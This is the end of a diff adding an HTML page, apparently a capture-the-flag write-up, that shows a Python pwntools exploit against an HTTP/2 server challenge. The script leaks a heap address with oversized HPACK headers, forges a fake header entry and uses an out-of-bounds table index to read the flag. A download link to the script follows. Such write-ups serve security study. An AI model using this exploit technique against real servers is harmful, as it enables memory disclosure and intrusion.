+</span><span>    </span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">__recv_header</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">self</span><span style="color:#9abdf5;">):
+</span><span>        header </span><span style="color:#89ddff;">= </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recv</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">9</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">timeout</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">.</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#2ac3de;">len </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">from_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">header</span><span style="color:#9abdf5;">[</span><span style="color:#89ddff;">:</span><span style="color:#ff9e64;">3</span><span style="color:#9abdf5;">])
+</span><span>
+</span><span>        </span><span style="color:#bb9af7;">if </span><span style="color:#2ac3de;">len </span><span style="color:#bb9af7;">&lt;= </span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">:
+</span><span>            </span><span style="font-style:italic;color:#bb9af7;">return </span><span>header
+</span><span>
+</span><span>        </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recv</span><span style="color:#9abdf5;">(</span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    </span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">self</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">recv</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">True</span><span style="color:#9abdf5;">):
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">(</span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">header</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">(</span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#bb9af7;">if </span><span>recv</span><span style="color:#9abdf5;">:
+</span><span>            </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">__recv_header</span><span style="color:#9abdf5;">()
+</span><span>            </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#f7768e;">self</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">__recv_header</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#565f89;"># This function was stolen from skuuk exploit
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">pack_int</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">n</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">prefix</span><span style="color:#9abdf5;">):
+</span><span>    N </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">8 </span><span style="color:#89ddff;">- </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prefix</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">if </span><span>n </span><span style="color:#bb9af7;">&lt; </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">1 </span><span style="color:#bb9af7;">&lt;&lt; </span><span>N</span><span style="color:#9abdf5;">) </span><span style="color:#89ddff;">- </span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">:
+</span><span>        </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">([</span><span style="color:#0db9d7;">int</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prefix</span><span style="color:#89ddff;">+</span><span style="color:#bb9af7;">f</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">{</span><span style="color:#7aa2f7;">n</span><span style="color:#e0af68;">:b</span><span style="color:#9abdf5;">}</span><span style="color:#89ddff;">&quot;.</span><span style="color:#7aa2f7;">rjust</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">N</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">0</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">)])
+</span><span>    n </span><span style="color:#89ddff;">-= </span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">1 </span><span style="color:#bb9af7;">&lt;&lt; </span><span>N</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1
+</span><span>    bts </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[]
+</span><span>    first </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">True
+</span><span>    </span><span style="color:#bb9af7;">while </span><span>first </span><span style="color:#bb9af7;">or </span><span>n</span><span style="color:#9abdf5;">:
+</span><span>        bt </span><span style="color:#89ddff;">= </span><span>n </span><span style="color:#89ddff;">&amp; 0x</span><span style="color:#ff9e64;">7f
+</span><span>        </span><span style="color:#bb9af7;">if </span><span>n </span><span style="color:#bb9af7;">&gt;= </span><span style="color:#89ddff;">0x</span><span style="color:#ff9e64;">7f</span><span style="color:#9abdf5;">:
+</span><span>            bt </span><span style="color:#89ddff;">|= 0x</span><span style="color:#ff9e64;">80
+</span><span>        </span><span style="color:#7aa2f7;">bts</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">append</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">bt</span><span style="color:#9abdf5;">)
+</span><span>        n </span><span style="color:#89ddff;">&gt;&gt;= </span><span style="color:#ff9e64;">7
+</span><span>        first </span><span style="color:#89ddff;">= </span><span style="color:#ff9e64;">False
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">([</span><span style="color:#0db9d7;">int</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">prefix</span><span style="color:#89ddff;">+</span><span style="color:#bb9af7;">f</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">{(</span><span style="color:#ff9e64;">1 </span><span style="color:#bb9af7;">&lt;&lt; </span><span style="color:#7aa2f7;">N</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1</span><span style="color:#e0af68;">:b</span><span style="color:#9abdf5;">}</span><span style="color:#89ddff;">&quot;, </span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">)]</span><span style="color:#89ddff;">+</span><span style="color:#7aa2f7;">bts</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="font-style:italic;color:#565f89;"># handshake
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">PRI * HTTP/2.0</span><span style="color:#89ddff;">\r\n\r\n</span><span style="color:#9ece6a;">SM</span><span style="color:#89ddff;">\r\n\r\n&quot;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recv</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span>    frame </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">Frame</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, 0x</span><span style="color:#ff9e64;">4</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;&#39;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">frame</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#565f89;"># leak
+</span><span>    e </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">Encoder</span><span style="color:#9abdf5;">()
+</span><span>    data </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[
+</span><span>        </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*0x</span><span style="color:#ff9e64;">fff</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">GET</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">,
+</span><span>        </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&quot;*0x</span><span style="color:#ff9e64;">fff</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">GET</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#9abdf5;">]
+</span><span>    data </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">e</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">encode</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">data</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">huffman</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">False</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    ret </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">Frame</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, 0x</span><span style="color:#ff9e64;">1</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recv</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">timeout</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">.</span><span style="color:#ff9e64;">01</span><span style="color:#9abdf5;">) </span><span style="font-style:italic;color:#565f89;"># some weird things happened in remote so I had to add this recv
+</span><span>
+</span><span>    flag </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">u64</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">ret</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">304</span><span style="color:#89ddff;">:</span><span style="color:#9abdf5;">][</span><span style="color:#89ddff;">:</span><span style="color:#ff9e64;">8</span><span style="color:#9abdf5;">])
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">success</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">flag @ 0x</span><span>%hx</span><span style="color:#89ddff;">&quot; % </span><span style="color:#7aa2f7;">flag</span><span style="color:#9abdf5;">)
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#565f89;"># fake header, size = 0x80, data = flag
+</span><span>    data </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">[
+</span><span>        </span><span style="color:#7aa2f7;">p64</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">0x</span><span style="color:#ff9e64;">80</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">+</span><span style="color:#7aa2f7;">p64</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">flag</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">, </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">flag</span><span style="color:#89ddff;">&#39;
+</span><span>    </span><span style="color:#9abdf5;">]
+</span><span>    data </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">e</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">add</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">data</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">False</span><span style="color:#9abdf5;">)
+</span><span>    ret </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">Frame</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, 0x</span><span style="color:#ff9e64;">1</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">()
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#565f89;"># OOB
+</span><span>    index </span><span style="color:#89ddff;">= </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">0x</span><span style="color:#ff9e64;">23040 </span><span style="color:#bb9af7;">&gt;&gt; </span><span style="color:#ff9e64;">5</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">+</span><span style="color:#ff9e64;">1</span><span style="color:#89ddff;">+</span><span style="color:#ff9e64;">61
+</span><span>    data </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">flat</span><span style="color:#9abdf5;">(
+</span><span style="color:#7aa2f7;">        pack_int</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">index</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">1</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">,
+</span><span style="color:#7aa2f7;">        pack_int</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">index</span><span style="color:#89ddff;">, &quot;</span><span style="color:#9ece6a;">1</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">,
+</span><span style="color:#7aa2f7;">    </span><span style="color:#9abdf5;">)
+</span><span>    ret </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">Frame</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">, 0x</span><span style="color:#ff9e64;">1</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#ff9e64;">0</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">data</span><span style="color:#9abdf5;">)</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">send</span><span style="color:#9abdf5;">()
+</span><span>    flag </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">ret</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">split</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">: </span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)[</span><span style="color:#89ddff;">-</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">decode</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span>flag
+</span></code></pre>
+<p><a href="/exploits/http3.py">download here</a></p>
+<p><strong>Written by <em>0xB0tm4n</em></strong></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
